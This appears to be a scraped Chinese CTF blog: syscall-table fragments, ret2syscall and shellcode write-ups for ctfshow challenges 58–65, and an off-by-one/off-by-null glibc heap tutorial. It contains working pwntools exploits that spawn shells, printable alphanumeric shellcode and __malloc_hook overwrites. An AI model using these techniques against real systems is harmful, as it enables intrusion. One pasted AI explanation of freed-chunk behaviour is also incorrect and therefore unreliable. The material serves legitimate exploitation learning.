133d for a.out */uselib 134personality 135ustat 136statfs 137fstatfs 138sysfs 139getpriority 140setpriority 141sched_setparam 142sched_getparam 143sched_setscheduler 144sched_getscheduler 145sched_get_priority_max 146sched_get_priority_min 147sched_rr_get_interval 148mlock 149munlock 150mlockall 151munlockall 152vhangup 153modify_ldt 154pivot_root 155_sysctl 156prctl 157arch_prctl 158adjtimex 159setrlimit 160chroot 161sync 162acct 163settimeofday 164mount 165umount2 166swapon 167swapoff 168reboot 169sethostname 170setdomainname 171iopl 172ioperm 173create_module 174init_module 175delete_module 176get_kernel_syms 177query_module 178quotactl 179nfsservctl 180or LiS/STREAMS */getpmsg 181putpmsg 182or AFS */afs_syscall 183or tux */tuxcall 184security 185gettid 186readahead 187setxattr 188lsetxattr 189fsetxattr 190getxattr 191lgetxattr 192fgetxattr 193listxattr 194llistxattr 195flistxattr 196removexattr 197lremovexattr 198fremovexattr 199tkill 200time 201futex 202sched_setaffinity 203sched_getaffinity 204set_thread_area 205io_setup 206io_destroy 207io_getevents 208io_submit 209io_cancel 210get_thread_area 211lookup_dcookie 212epoll_create 213epoll_ctl_old 214epoll_wait_old 215remap_file_pages 216getdents64 217set_tid_address 218restart_syscall 219semtimedop 220fadvise64 221timer_create 222timer_settime 223timer_gettime 224timer_getoverrun 225timer_delete 226clock_settime 227clock_gettime 228clock_getres 229clock_nanosleep 230exit_group 231epoll_wait 232epoll_ctl 233tgkill 234utimes 235vserver 236mbind 237set_mempolicy 238get_mempolicy 239mq_open 240mq_unlink 241mq_timedsend 242mq_timedreceive 243mq_notify 244mq_getsetattr 245kexec_load 246waitid 247add_key 248request_key 249keyctl 250ioprio_set 251ioprio_get 252inotify_init 253inotify_add_watch 254inotify_rm_watch 255migrate_pages 256openat 257mkdirat 258mknodat 259fchownat 260futimesat 261newfstatat 262unlinkat 263renameat 264linkat 265symlinkat 266readlinkat 267fchmodat 268faccessat 269pselect6 270ppoll 271unshare 272set_robust_list 273get_robust_list 274splice 275tee 276sync_file_range 277vmsplice 278move_pages 279utimensat 280ORE_getcpu /* implemented as a vsyscall */epoll_pwait 281signalfd 282timerfd_create 283eventfd 284fallocate 285timerfd_settime 286timerfd_gettime 287accept4 288signalfd4 289eventfd2 290epoll_create1 291dup3 292pipe2 293inotify_init1 294preadv 295pwritev 296rt_tgsigqueueinfo 297perf_event_open 298recvmmsg 299fanotify_init 300fanotify_mark 301prlimit64 302name_to_handle_at 303open_by_handle_at 304clock_adjtime 305syncfs 306sendmmsg 307set_ns 308get_cpu 309process_vm_readv 310process_vm_writev 311\n\n2.传递参数\n32位系统所需参数依次存放在 寄存器eax、ebx、ecx、edx、esi、edi 和 ebp \n\n\n\n设置 eax 寄存器\n设置 edx 寄存器\n设置 ecx 寄存器\n设置 ebx 寄存器\n\n\n\n0xb(execve 的系统调用号)\n0（NULL）\n0(NULL)\n/bin/sh 字符串的地址\n\n\n64位系统所需参数依次存放在寄存器rax、rdi、rsi、rdx、r10、r8 和 r9 \n\n\n\n设置 rax 寄存器\n设置 rdx 寄存器\n设置 rsi 寄存器\n设置 rdi 寄存器\n\n\n\n0x3b(execve 的系统调用号)\n0（NULL）\n0(NULL)\n/bin/sh 字符串的地址\n\n\n3.触发系统调用\n32 位系统使用 int0x80 指令来触发系统调用，64 位系统使用 syscall 指令来触发系统调用\n例题ctfshow71（32位ret2syscall）Arch:       i386-32-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX enabledPIE:        No PIE (0x8048000)Stripped:   NoDebuginfo:  Yes\n\n32位，开启NX保护，栈不可执行\npwn: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped\nstatically linked静态编译\nida：\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v4; // [esp+1Ch] [ebp-64h] BYREF  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts(&quot;===============CTFshow--PWN===============&quot;);  puts(&quot;Try to use ret2syscall!&quot;);  gets(&amp;v4);  return 0;\n\ngets栈溢出\n偏移：112\n0x080bb196 : pop eax ; ret\n0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret\n0x080be408 : /bin/sh\n0x08049421 : int 0x80\nexp：\nfrom pwn import*io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28306)pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421binsh = 0x80be408payload = b&#x27;a&#x27;*(112)+p32(pop_eax_ret)               payload += p32(0xb)+p32(pop_edx_ecx_ebx_ret)   #系统调用号payload += p32(0)+p32(0)+p32(binsh)            #三个参数payload += p32(int_0x80)                       #触发系统调用io.sendline(payload)io.interactive()\n","categories":["第四周"],"tags":["知识点"]},{"title":"shellcode（ctfshow58-64）","url":"/2025/01/30/shellcode1/","content":"ctfshow58Arch:       i386-32-little   RELRO:      Partial RELRO   Stack:      No canary found   NX:         NX unknown - GNU_STACK missing   PIE:        No PIE (0x8048000)   Stack:      Executable   RWX:        Has RWX segments   Stripped:   No\n\n32位程序，NX保护没开，栈可以执行\nida：main函数调用了ctfshow函数\nadd     esp, 10hsub     esp, 0Chlea     eax, [ebp+s]push    eax             ; scall    ctfshow\n\nctfshow函数\nint __cdecl ctfshow(char *s)&#123;  gets(s);  return puts(s);&#125;\n\n存在gets函数栈溢出，并且gets函数写入的地址 [ebp+s] 在后面会被调用，且栈可以执行，所以我们直接写入shellcode就可以\ncall    _getsadd     esp, 10hsub     esp, 0Chpush    [ebp+s]\n\nadd     esp, 10hlea     eax, [ebp+s]call    eax\n\nexp:\nfrom pwn import*context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28158)shellcode = asm(shellcraft.sh())payload = shellcodeio.sendline(payload)io.interactive()\n\nctfshow59这道题与上一道一样只不过是64位的，注意生成shellcode的时候需要注明架构为64位\nfrom pwn import*context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28306)shellcode = asm(shellcraft.sh())payload = shellcodeio.sendline(payload)io.interactive()\n\nctfshow60Arch:       i386-32-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX unknown - GNU_STACK missing    PIE:        No PIE (0x8048000)    Stack:      Executable    RWX:        Has RWX segments    Stripped:   No    Debuginfo:  Yes\n\n32位，NX保护没有开启，栈可以执行\nida：gets函数存在栈溢出，使用strncpy函数将对应的字符串复制到 buf2 处\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s[100]; // [esp+1Ch] [ebp-64h] BYREF  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts(&quot;CTFshow-pwn can u pwn me here!!&quot;);  gets(s);  strncpy(buf2, s, 100u);  printf(&quot;See you ~&quot;);  return 0;&#125;\n\n我们看一下buf2所在的位置\n\n然后看看bss段是否可执行\n\n我们看到是不可执行的，但是去看了一下师傅们的wp发现是可执行的，应该是版本的问题\n\n思路：我们将shellcode写入，然后填充垃圾数据覆盖返回地址为buf2，就可以了，因为strncpy函数会将对应的字符串复制到 buf2 处，所以shellcode也会被复制到buf2\n偏移为：112\nida是有问题的\n\nexp：\nfrom pwn import*context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28249)buf2 = 0x0804A080shellcode = asm(shellcraft.sh())payload = shellcode.ljust(112,b&#x27;a&#x27;)+p32(buf2)           #使用 ljust 函数将 shellcode 字符串用a补充到长度为 112io.sendline(payload)io.interactive()\n\nctfshow61Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX unknown - GNU_STACK missing    PIE:        PIE enabled    Stack:      Executable    RWX:        Has RWX segments    Stripped:   No\n\n64位，NX保护关闭，栈可以执行,开启PIE保护地址随机化\nida：我们发现 printf函数将v5的地址打印出来了，我们可以将v5的地址接受保存下来，并将shellcode写入v5，再将返回地址覆盖为v5的地址就可以，但是v5到ret_addr的长度只有16字节，而shellcode要32字节，不会了，看一下师傅们的wp\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  FILE *v3; // rdi  __int64 v5[2]; // [rsp+0h] [rbp-10h] BYREF  v5[0] = 0LL;  v5[1] = 0LL;  v3 = _bss_start;  setvbuf(_bss_start, 0LL, 1, 0LL);  logo(v3, 0LL);  puts(&quot;Welcome to CTFshow!&quot;);  printf(&quot;What&#x27;s this : [%p] ?\\n&quot;, v5);  puts(&quot;Maybe it&#x27;s useful ! But how to use it?&quot;);  gets(v5);  return 0;&#125;\n\n原来不只是长度不够，还有leave的问题\nleave的作用相当于MOV SP,BP；POP BP。 因为leave指令会释放栈空间，因此我们不能使用v5后面的24字节\n而且v5后的8个字节也不能存放（这里需要存放返回地址），所以我们只能将shellcode放在v5后的32字节的地方，并将返回地址改为v5后面32字节的地方\n如何接受到v5的正确地址：\n\n我们可以看到v5的地址实在[]里\nio.recvuntil(b&#x27;[&#x27;)                        #输入流中首先接收数据直到遇到 &#x27;[&#x27; 字符为止v5 = io.recvuntil(b&#x27;]&#x27;, drop=True)        #再次接收直到遇到 &#x27;]&#x27; 字符为止v5 = int(v5, 16)                          #将变量 v5 解析为一个十六进制的整数#获取到的是字节串,p64()的参数是整形,要把字节串转化成整形# 不能用hex(int(v5_addr, 16)),因为hex的结果是字符串,不能传给p64()\n\nexp：\nfrom pwn import *context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28114)shellcode = asm(shellcraft.sh())io.recvuntil(b&#x27;[&#x27;)v5 = io.recvuntil(b&#x27;]&#x27;, drop=True)v5 = int(v5, 16)print(hex(v5))                    #打印v5的十六进制表示payload = b&#x27;a&#x27;*(0x10+0x8)         #溢出到返回地址payload += p64(v5+32)             #将将返回地址改为v5后面32字节的地方payload += shellcode              #将shellcode写入到v5后面32字节的地方io.sendline(payload)io.interactive()\n\nctfshow62Arch:       amd64-64-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX unknown - GNU_STACK missingPIE:        PIE enabledStack:      ExecutableRWX:        Has RWX segmentsStripped:   No\n\n64位，NX保护关闭，栈可以执行,开启PIE保护地址随机化\nida：和上一题一样，只不过read为0x38字节（56），栈空间24，返回地址8不可用，所以最大写入的是56-24-8&#x3D;24，而自动生成的shellcode是0x30，所以不够了，看了一下师傅们的wp，需要找更短的shellcode\nshellcode =b&quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&quot;   #22bytes\n\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  FILE *v3; // rdi  __int64 buf[2]; // [rsp+0h] [rbp-10h] BYREF  buf[0] = 0LL;  buf[1] = 0LL;  v3 = _bss_start;  setvbuf(_bss_start, 0LL, 1, 0LL);  logo(v3, 0LL);  puts(&quot;Welcome to CTFshow!&quot;);  printf(&quot;What&#x27;s this : [%p] ?\\n&quot;, buf);  puts(&quot;Maybe it&#x27;s useful ! But how to use it?&quot;);  read(0, buf, 0x38uLL);  return 0;&#125;\n\nexp\nfrom pwn import *context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28286)shellcode =b&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&#x27;io.recvuntil(b&#x27;[&#x27;)v5 = io.recvuntil(b&#x27;]&#x27;, drop=True)v5 = int(v5, 16)print(hex(v5))payload = b&#x27;a&#x27;*(0x10+0x8)payload += p64(v5+32)payload += shellcodeio.sendline(payload)io.interactive()\n\nctfshow63ida：和上一题一样，只不过可读入的更少了，只有0x37（55），55-24-8&#x3D;23，上一题用的shellcode为22字节，还可以用\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  FILE *v3; // rdi  __int64 buf[2]; // [rsp+0h] [rbp-10h] BYREF  buf[0] = 0LL;  buf[1] = 0LL;  v3 = _bss_start;  setvbuf(_bss_start, 0LL, 1, 0LL);  logo(v3, 0LL);  puts(&quot;Welcome to CTFshow!&quot;);  printf(&quot;What&#x27;s this : [%p] ?\\n&quot;, buf);  puts(&quot;Maybe it&#x27;s useful ! But how to use it?&quot;);  read(0, buf, 0x37uLL);  return 0;&#125;\n\nexp：\nfrom pwn import *context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28224)shellcode =b&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&#x27;io.recvuntil(b&#x27;[&#x27;)v5 = io.recvuntil(b&#x27;]&#x27;, drop=True)v5 = int(v5, 16)print(hex(v5))payload = b&#x27;a&#x27;*(0x10+0x8)payload += p64(v5+32)payload += shellcodeio.sendline(payload)io.interactive()\n\nctfshow64Arch:       i386-32-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX enabledPIE:        No PIE (0x8048000)Stripped:   No\n\n32位，NX保护开启，栈不可执行\nida：\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  void *buf; // [esp+8h] [ebp-10h]  buf = mmap(0, 0x400u, 7, 34, 0, 0);  alarm(0xAu);  setvbuf(stdout, 0, 2, 0);  setvbuf(_bss_start, 0, 2, 0);  puts(&quot;Some different!&quot;);  if ( read(0, buf, 0x400u) &lt; 0 )  &#123;    puts(&quot;Illegal entry!&quot;);    exit(1);  &#125;  ((void (*)(void))buf)();  return 0;\n\n首先 buf &#x3D; mmap(0, 0x400u, 7, 34, 0, 0)没看懂，搜了一下\n#include &lt;sys/mman.h&gt;void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);\n\n\n\n\naddr\nlength\nprot\nflags\nfd\noffset\n\n\n\n指定映射区域的起始地址（则由操作系统选择合适的地址）\n映射区域的大小\n决定映射区域的保护属性（设置为7可读可写可执行）\n决定映射的类型和行为\n文件描述符，用于指定要映射的文件\n文件的偏移量，指定从文件的哪个位置开始映射\n\n\n这个题将buf 将被设置为映射区域的起始地址，映射区域的大小为 0x400 字节，保护标志为7（映射的内存区域可以读、写和执行）\n大小0x400，足够写入shellcode，并且可以执行\n在看后面是一个if，是判断是否读取成功，如果 read 返回值小于 0，说明读取失败，并且退出程序\n最后((void (*)(void))buf)()\n将 buf 强制转换为一个函数指针类型，并且调用buf，我们将shellcode写入buf，就会被调用\nexp\nfrom pwn import*context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28112)shellcode = asm(shellcraft.sh())payload = shellcodeio.sendline(payload)io.interactive()\n\n\n\n","categories":["第三周"],"tags":["wp"]},{"title":"shellcode（ctfshow65）","url":"/2025/01/31/shellcode2/","content":"ctfshow65Arch:       amd64-64-littleRELRO:      Full RELROStack:      No canary foundNX:         NX unknown - GNU_STACK missingPIE:        PIE enabledStack:      ExecutableRWX:        Has RWX segmentsStripped:   No\n\n64位，开启PIE,完全开启RELRO,Has RWX segments  \nida：无法反编译，借助ai理解一下代码\n汇编代码1.jl (Jump if Less)\ncmp eax, ebxjl loc_1234\n\n如果 eax &lt; ebx，则跳转到 loc_1234\n2.jg (Jump if Greater)\ncmp eax, ebxjg loc_1234\n\n如果 eax &gt; ebx，则跳转到 loc_1234\n3.jle (Jump if Less or Equal)\ncmp eax, ebxjle loc_1234\n\n如果 eax &lt;= ebx，则跳转到 loc_1234\n4.jmp (Jump)\njmp loc_1234\n\n无论条件如何，都会跳转到 loc_1234\n5.cmp (Compare)\ncmp eax, ebx\n\n比较 eax 和 ebx 的大小，并根据结果设置标志位\n6.cdqe、movzx\ncdqemovzx   eax, [rbp+rax+buf]\n\n这个实在看不懂，粘一下师傅们的解释\ncdqe使用eax的最高位拓展rax高32位的所有位 movzx则是按无符号数传送+扩展（16-32） EAX是32位的寄存器，而AX是EAX的低16位,AH是ax的高8位，而AL是ax的低8位大致就是将我们输入的字符串每一位进行比较\nmain:    push    rbp    mov     rbp, rsp    sub     rsp, 410h    mov     edx, 14h    lea     rsi, aInputYouShellc    mov     edi, 1    mov     eax, 0    call    _write    lea     rax, [rbp+buf]    mov     edx, 400h    mov     rsi, rax    mov     edi, 0    mov     eax, 0    call    _read    mov     [rbp+var_8], eax    cmp     [rbp+var_8], 0    jg      short loc_11AC    mov     eax, 0    jmp     locret_1254\n\n提示用户输入：\n使用 _write 函数向标准输出打印提示信息 &quot;Input you Shellcode\\n&quot;。\n读取用户输入：\n使用 _read 函数从标准输入读取用户输入的数据，存储到缓冲区 buf 中。\nvar_8 存储了 _read 的返回值，表示实际读取的字节数。\n检查输入长度：\n如果 var_8 &gt; 0，表示用户输入了数据，程序跳转到 loc_11AC。\n如果 var_8 &lt;= 0，表示用户没有输入任何内容，程序直接返回\nloc_11AC:    mov     [rbp+var_4], 0    jmp     loc_123Aloc_11B8:    mov     eax, [rbp+var_4]    cdqe    movzx   eax, [rbp+rax+buf]    cmp     al, 60h ; &#x27;`&#x27;    jle     short loc_11DA    mov     eax, [rbp+var_4]    cdqe    movzx   eax, [rbp+rax+buf]    cmp     al, 7Ah ; &#x27;z&#x27;    jle     short loc_1236    jmp     loc_11DAloc_11DA:    mov     eax, [rbp+var_4]    cdqe    movzx   eax, [rbp+rax+buf]    cmp     al, 40h ; &#x27;@&#x27;    jle     short loc_11FC    mov     eax, [rbp+var_4]    cdqe    movzx   eax, [rbp+rax+buf]    cmp     al, 5Ah ; &#x27;Z&#x27;    jle     short loc_1236    jmp     loc_11FCloc_11FC:    mov     eax, [rbp+var_4]    cdqe    movzx   eax, [rbp+rax+buf]    cmp     al, 2Fh ; &#x27;/&#x27;    jle     short loc_121E    mov     eax, [rbp+var_4]    cdqe    movzx   eax, [rbp+rax+buf]    cmp     al, 5Ah ; &#x27;Z&#x27;    jle     short loc_1236    jmp     loc_121Eloc_121E:    lea     rdi, format    mov     eax, 0    call    _printf    mov     eax, 0    jmp     locret_1254loc_1236:    add     [rbp+var_4], 1    jmp     loc_123Aloc_123A:    mov     eax, [rbp+var_4]    cmp     eax, [rbp+var_8]    jl      loc_11B8    lea     rax, [rbp+buf]    call    rax    mov     eax, 0locret_1254:    leave    retn\n\n初始化索引：\n在 loc_11AC，程序将 var_4 初始化为 0。\n循环检查输入内容：\n在 loc_11B8，程序逐字节检查用户输入的内容：\n如果字节值在 [0x2F, 0x5A] 或 [0x40, 0x5A] 或 [0x60, 0x7A] 范围内，程序继续检查下一个字节。\n[0x2F, 0x5A]：/到 Z（包括大小写字母和一些符号）\n[0x40, 0x5A]：@ 到 Z（主要是大写字母和一些符号）\n[0x60, 0x7A]：反引号到  z（主要是小写字母和一些符号）\n如果字节值不在上述范围内，程序打印 &quot;Good,but not right&quot; 并返回。\n执行用户输入：\n如果所有字节都满足条件，程序会将 buf 的地址加载到寄存器 rax 中，并调用 buf。这意味着程序会尝试执行用户输入的内容\n这些范围正好是ASSCII码的范围，我们可以直接将shellcode输入到buf，后面程序就会调用，但是输入的shellcode需要是可见字符string.printable\n生成可见字符shellcode使用alpha3就可以生成\nalpha031.生成shellcodefrom pwn import *context.arch=&#x27;amd64&#x27;sc = asm(shellcraft.sh())with open(&#x27;sc&#x27;, &#x27;bw&#x27;) as f:\tf.write(sc)\n\n2.将上述代码保存成sc.py放到alpha3目录下，然后执行如下命令生成待编码的shellcode文件python3 sc.py &gt; sc\n\n3.使用alpha3生成string.printable （这里得用 python2）\npython2 ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc&quot;  #这里的参数 rax 是需要填入执行 shellcode 的那个寄存器\n\nshellcode=&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;\n\n\nexp：from pwn import*context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28139)shellcode=&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;payload = shellcode io.send(payload)   #注意不能用sendline换行符不在区间里io.interactive()\n\n","categories":["第三周"],"tags":["wp"]},{"title":"off by","url":"/2025/11/18/off-by/","content":"\n一、2.231.off by one，fastbin attack打malloc1.通过off by one使堆块合并泄露libc\nadd(0x18,b&#x27;aaaa&#x27;)add(0x68,b&#x27;bbbb&#x27;)add(0x68,b&#x27;cccc&#x27;)add(0x18,b&#x27;dddd&#x27;)edit(0,b&#x27;a&#x27;*24+b&#x27;\\xe1&#x27;)free(1)add(0x68,b&#x27;\\x00&#x27;*8)show(2)from pwn import *context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)#p=remote(&#x27;node3.buuoj.cn&#x27;,28465)p=process(&#x27;./vm&#x27;)elf=ELF(&#x27;./vm&#x27;)libc = ELF(&#x27;/home/he/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;)def bug():    gdb.attach(p)def add(size,content):        p.recvuntil(&quot;choice: &quot;)        p.sendline(&quot;1&quot;)        p.sendlineafter(&quot;size?&quot;,str(size))        p.sendlineafter(&quot;content:&quot;,content)def edit(idx,content):        p.recvuntil(&quot;choice: &quot;)        p.sendline(&quot;2&quot;)        p.sendlineafter(&quot;idx?&quot;,str(idx))        p.sendlineafter(&quot;content:&quot;,content)def dump(idx):        p.recvuntil(&quot;choice: &quot;)        p.sendline(&quot;3&quot;)        p.sendlineafter(&quot;idx?&quot;,str(idx))def free(idx):        p.recvuntil(&quot;choice: &quot;)        p.sendline(&quot;4&quot;)        p.sendlineafter(&quot;idx?&quot;,str(idx))add(0x18,b&#x27;aaaa&#x27;)add(0x68,b&#x27;bbbb&#x27;)add(0x68,b&#x27;cccc&#x27;)add(0x18,b&#x27;dddd&#x27;)edit(0,b&#x27;a&#x27;*24+b&#x27;\\xe1&#x27;)free(1)#bug()add(0x68,b&#x27;\\x00&#x27;*8)dump(2)fd = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))log.success(&#x27;fd:&#x27;+hex(fd))libc_base = fd - 0x3c4b78log.success(&#x27;libc_base:&#x27;+hex(libc_base))malloc_hook=libc_base+libc.sym[&#x27;__malloc_hook&#x27;]fake_chunk_addr=malloc_hook-0x23log.success(&#x27;fake_chunk_addr:&#x27;+hex(fake_chunk_addr))add(0x68,b&#x27;\\x00&#x27;*8)free(2)edit(4,p64(fake_chunk_addr))add(0x68,b&#x27;aaaa&#x27;)#bug()one_gadget=libc_base+0x4527arealloc_addr=libc_base+libc.sym[&#x27;__libc_realloc&#x27;]log.success(&#x27;realloc_addr:&#x27;+hex(realloc_addr))log.success(&#x27;one_gadget:&#x27;+hex(one_gadget))payload=b&#x27;a&#x27;*(0x13-0x08)+p64(one_gadget)+p64(realloc_addr+12)bug()add(0x68,payload)p.recvuntil(&quot;choice: &quot;)p.sendline(&quot;1&quot;)p.sendlineafter(&quot;size?&quot;,str(0x18))p.interactive()\n\nadd(0x18, ‘aaaa’) #0\n必须是0x8结尾，这样才能覆盖size位\nadd(0x68, ‘aaaa’) #1\nadd(0x68, ‘aaaa’) #2\n合并的堆块要进入unsortbins\nadd(0x10, ‘aaaa’) #3\npayload &#x3D; ‘a’*0x18 + ‘\\xe1’  \n\\xe1是两个堆块合并后size位的大小\nedit(0, payload) \n往堆块0里面写因为off by one多写一个字节，使堆块1的size位被覆盖使得堆块1，2合并\ndelete(1)           \nfree掉堆块1，虽然在gdb中显示的是合并的整个大堆块被free了，但是堆块2并未被真正free，指针位未清零\nadd(0x60, ‘aaaa’)  \n将堆块1申请出来，堆块2还是被free状态（但是指针位未清零，此时fd与bk都指向main_arena+88，也就是unstort的头）\nshow(2）\n打印堆块2，就可以将main_arena+88的地址打印出来，根据偏移就可以算出libc\nfake_chunk_addr&#x3D;malloc_hook-0x23 \n假堆块的地址，为什么要选泽malloc_hook-0x23 因为malloc_hook-0x23，因为这里的size是0x7f，属于fastbin的范围，而且是在malloc_hook与realloc_hook的下面，可以修改其值，执行为one_gadget\nadd(0x68,b’\\x00’*8)\n将被指针未清零的的堆块2申请出来，也就是堆块4，堆块2，4指向的是同一个位置（所以gdb中只显示四个堆块）\nfree(4)\n将堆块4free\nedit(2,p64(fake_chunk_addr))\n通过堆块2修改已经free的堆块4的fd指针，修改为假的堆块地址\nadd(0x68,b’aaaa’)\n将堆块4申请出来\npayload&#x3D;b’a’*(0x13-0x08)+p64(one_gadget)+p64(realloc_addr+12)\n#bug()\nadd(0x68,payload)\n这个堆块在gdb中是看不到的，但是可以通过查看内存，看内容是否被更改\n这个堆块就是假的堆块了（0x13-0x08）这个是从malloc_hook-0x13的位置开始写入，因为size位0x10，指针指向写入数据的地方，-0x8是因为malloc_hook-0x8就是realloc_hook,将（malloc_hook-0x8）也就是realloc_hook的位置写入one_gadget,将malloc_hook的地方写入realloc_addr+12（这个是为了满足one_gadget调用的条件）\n\n**malloc_hook** 设置为 **realloc+offest**：通过覆盖堆上的函数指针，将 malloc_hook 指向 realloc。\n**realloc_hook** 设置为 **one_gadget**：通过覆盖堆上的另一个函数指针，将 realloc_hook 指向 one_gadget。\n\n这样，程序在调用 malloc 时，会跳转到 realloc，而在执行 realloc 时，会跳转到 one_gadget，最终执行恶意代码\n主要原因、realloc函数中有大量的push指令**（在执行__realloc_hook之前），因此我们将realloc函数的地址加上一定的偏移，就可以选择去执行一定量的push指令，从而抬高栈帧（我指的抬高栈帧是栈帧又向着低地址增长了）。这样rsp增加了之后，我们就可以控制例如rsp+0x30，让其内存值正好落在0处。\n\n\np.recvuntil(“choice: “)\np.sendline(“1”)\np.sendlineafter(“size?”,str(0x18))\np.interactive()\n调用malloc获取shell\n调用malloc函数—-&gt;判断是否有malloc_hook，有则调用之—-&gt;我们这里malloc_hook设置的为realloc函数+offset，程序便到此处执行—-&gt;执行realloc函数时，会判断是否有realloc_hook，有则调用之—-&gt;我们这里realloc_hook设置的为one_gadget，所以便会转到one_gadget处执行。\n疑问：那为什么不可以直接修改堆块2的内容也就是修改fd的值为假堆块，也就是为什么堆块2可以被打印，但无法修改里面的内容\n答案来自gpt：\n\n堆块合并：通过修改堆块的 size 字段，堆块1和堆块2被堆管理器合并成一个大的空闲堆块，释放堆块1，虽然gdb中显示整个大堆块被释放，但是堆块2并没有被显式释放。\n堆块2依然存在：虽然堆块2在gdb中显示被释放，但堆管理器并没有清除其内容，因此堆块2的内存仍然可以被访问，甚至打印出来。\n堆块2无法修改：因为堆块2已经被堆管理器标记为“空闲”，堆管理器限制了对其的修改操作，以防止潜在的内存破坏和不一致性。\n堆管理的内存保护：空闲块的内容通常不会被修改，堆管理器会确保内存的完整性，避免对空闲块的修改。只有在空闲块被重新分配或被进一步操作时，堆块的内容才可能被清除或修改。\n\nfastbins打malloc_hook与free_hook,都把堆块申请在malloc_hook&#x2F;free_hook-0x23\n2.off by null1.利用off by null，堆块合并泄露libc1.有edit\nadd(0x200,b&#x27;chunk0&#x27;)add(0x68,b&#x27;chunk1&#x27;)add(0x1f0,b&#x27;chunk2&#x27;)add(0x10,b&#x27;chunk3&#x27;)bug()free(0)edit(1,b&#x27;a&#x27;*0x60+p64(0x280))free(2)bug()add(0x200,b&#x27;chunk0&#x27;)show(1)fd = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))\n\nadd(0x200,b’chunk0’) \n这个随便但是要在unsortbins\nadd(0x68,b’chunk1’)\n必须在fastbins，而且必须是0x8结尾，因为这样才能覆盖到chunk2的pre_size位\nadd(0x1f0,b’chunk2’)\n堆块的size位必须是整百，这样off by null溢出的\\x00就会将p位覆盖为零且不影响size位\nadd(0x10,b’chunk3’)\n防止与top_chunk合并\nbug()\nfree(0)\n为后来泄露libc做准备\nedit(1,b’a’*0x60+p64(0x280))\n覆盖堆块1的pre_size位与p位，欺骗前面的堆块被free\nfree(2)\n使三个堆块合并成一个大堆块\nadd(0x200,b’chunk0’)\n将堆块0申请回来，使fd与bk压入堆块1\nshow(1)\n泄露libc\n2.没有edit，使用add来修改size位\nadd(0x200,b&#x27;chunk0&#x27;)add(0x18,b&#x27;chunk1&#x27;)add(0x1f0,b&#x27;chunk2&#x27;)add(0x10,b&#x27;chunk3&#x27;)bug()free(0)free(1)add(0x18,b&#x27;a&#x27;*0x10+p64(0x230))free(2)bug()add(0x200,b&#x27;chunk0&#x27;)show(0)fd = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, 